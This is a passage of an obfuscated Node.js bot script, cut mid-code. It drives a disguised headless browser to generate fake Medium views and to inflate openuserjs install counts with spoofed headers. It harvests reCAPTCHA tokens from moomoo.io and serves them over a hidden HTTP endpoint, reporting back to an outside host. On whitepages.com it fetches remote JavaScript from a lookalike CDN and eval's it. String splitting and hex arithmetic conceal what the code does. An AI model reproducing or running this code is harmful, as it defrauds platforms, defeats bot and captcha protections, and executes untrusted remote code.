      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + U(0xc) + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + U(0x6) + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x4f8 + 0x41c * 0x7 + 0x1fc * -0x11
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x89c + -0x1 * -0x2604 + -0x2 * 0xeb4)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x12a0 + -0x73 * 0x53 + 0x130d), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x751 * -0x4 + 0x2 * -0x23 + 0x1dee), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x2358 + -0x2 * 0x6f7 + -0x156a;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x33f * -0xb + -0x1472 * 0x1 + 0x3827; w < getRandomInt(-0x315 * -0x5 + 0x47 * 0x2e + -0x1c2a, 0xdb3 + 0xeec + 0x20b * -0xe); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x11 * 0x10fd + -0x86b6 + 0x291e3);
        }
      }();
    }, -0x3 * 0x745 + -0x1962 + 0x2f95), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x2 * -0x425 + -0x221 * -0x1 + 0x629;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x2378 + -0x1813 * 0x1 + 0x13d9 * 0x3, 0x1159 + -0x251 + -0x3 * 0x4f2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x3e54 + -0x7ea4 + 0x13228);
    }, -0x19eb + 0x12e3 + 0x76c), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1dc9 + -0x515 * 0x7 + 0x415c;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x3 * 0x6a0 + 0x1 * -0x537 + -0x1 * -0x24cf), await u['evaluate'](() => {
            const X = c;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + X(0x11) + 'me/cdn/xm7' + '7/wp.js', 0x287 + 0x13 * 0x2b + -0x5b8), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x638ef * 0x3 + 0x9f7 * -0x79 + 0x1 * -0x396e);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xc84 + -0xf58 + 0x1c40);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const Y = c,
      i = url['parse'](f['url'])['pathname'];
    h[Y(0x2)](0x938 + 0x1269 * 0x1 + -0x8f3 * 0x3);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1b9f * 0x1 + -0x1e07 + 0x13 * 0x4b2);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = d,
    Z = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x14 * 0x7e + 0x76d * 0x1 + 0x26c * 0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x196a + 0x3 * 0x6af + 0x6 * 0xe5));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x15 * -0x121 + -0x13bc + -0x3f9, D['indexOf']('\x20'));
        return B ? E['slice'](-0xf3e + -0x2324 + 0x3262, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xb * -0x22d + 0x68 * -0xbb + 0x8af7),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x79 + -0x2b91 * -0x1 + -0x4fa),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      Z(0x7, '5tIX') + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + a0(0xe),
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x5 * 0xae + -0x89 * -0x27 + 0x3 * -0x817; k < 0x1d03 + -0x2363 * -0x1 + -0x4062; k++)
    setTimeout(f, (0x51d9 * -0x3 + -0xd3 * 0x67 + 0x70 * 0x50b) * k * getRandomInt(0x1ffd + 0x3 * -0xa4a + -0x11e, 0x2 * -0x5d9 + 0x21ad + -0x15f8));
  setInterval(() => {
    f();
    for (let l = 0x17ee + -0x43f * -0x7 + -0x35a7; l < 0xa3 * -0x35 + -0x2d4 + -0x1d * -0x143; l++)
      setTimeout(f, (0x720c + 0x1524 * -0x12 + 0x6 * 0x537a) * l * getRandomInt(0x102c + 0x238 + -0x621 * 0x3, 0x111 + -0x7 * 0x89 + 0x2b1));
  }, 0x1 * 0x2508e5 + 0x62532a + -0xc06d * 0x6b);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
